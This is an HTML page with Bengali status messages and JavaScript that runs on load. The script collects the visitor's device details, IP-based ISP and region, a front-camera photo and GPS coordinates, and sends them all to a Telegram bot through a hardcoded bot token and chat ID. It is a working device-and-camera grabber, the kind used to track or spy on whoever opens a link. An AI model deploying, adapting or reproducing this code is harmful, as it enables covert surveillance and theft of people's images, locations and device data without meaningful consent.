<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📦 Auto Send: Device Info + Camera + Location</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f9fc;
      text-align: center;
      padding: 40px;
    }
    #status {
      margin-top: 20px;
      font-size: 17px;
      color: #2c3e50;
    }
  </style>
</head>
<body>
  <h2>📲 তথ্য পাঠানো হচ্ছে...</h2>
  <p id="status">⏳ শুরু হচ্ছে...</p>

  <video id="video" autoplay playsinline width="280" style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
    const CHAT_ID = "1054739462";
    const status = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    function detectBrand(ua) {
      ua = ua.toLowerCase();
      if (ua.includes("samsung") || ua.includes("sm-")) return "Samsung";
      if (ua.includes("redmi") || ua.includes("xiaomi")) return "Xiaomi";
      if (ua.includes("realme") || ua.includes("rmx")) return "Realme";
      if (ua.includes("oppo")) return "Oppo";
      if (ua.includes("vivo")) return "Vivo";
      if (ua.includes("iphone") || ua.includes("ios")) return "Apple";
      if (ua.includes("oneplus")) return "OnePlus";
      return "❓ অজানা কোম্পানি";
    }

    async function sendAllData() {
      status.innerText = "🔍 ডিভাইস তথ্য নিচ্ছে...";
      let batteryInfo = "🔋 Battery: Unknown";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
      } catch (e) {}

      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const memory = navigator.deviceMemory || "Unknown";
      const cores = navigator.hardwareConcurrency || "Unknown";
      const screenRes = `${screen.width}x${screen.height}`;
      const brand = detectBrand(ua);

      let ispInfo = "🌐 ISP: Unknown", location = "🌍 Location: Unknown";
      try {
        const ipRes = await fetch("https://ipwho.is/");
        const ipData = await ipRes.json();
        ispInfo = `🌐 ISP: ${ipData.connection?.isp || "N/A"}`;
        location = `🌍 Country: ${ipData.country}, Region: ${ipData.region}`;
      } catch (e) {}

      const info = `📱 ডিভাইস তথ্য
━━━━━━━━━━━━
🏷️ কোম্পানি: ${brand}
🛠️ User-Agent: ${ua}
🧠 Platform: ${platform}
💾 RAM: ${memory} GB
🧮 CPU Cores: ${cores}
📐 Screen: ${screenRes}
${batteryInfo}
${ispInfo}
${location}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: info })
      });

      status.innerText = "📸 ক্যামেরা চালু হচ্ছে...";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        setTimeout(async () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
          stream.getTracks().forEach(track => track.stop());

          let mapURL = "📍 Location: Unknown";
          try {
            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
            const { latitude, longitude } = pos.coords;
            mapURL = `📍 https://www.google.com/maps?q=${latitude},${longitude}`;
          } catch (e) {}

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", photoBlob, "photo.jpg");
          formData.append("caption", mapURL);

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          status.innerText = "✅ সব তথ্য ও ছবি পাঠানো হয়েছে!";
        }, 3000);
      } catch (e) {
        status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
      }
    }

    window.onload = sendAllData;
  </script>
</body>
</html>
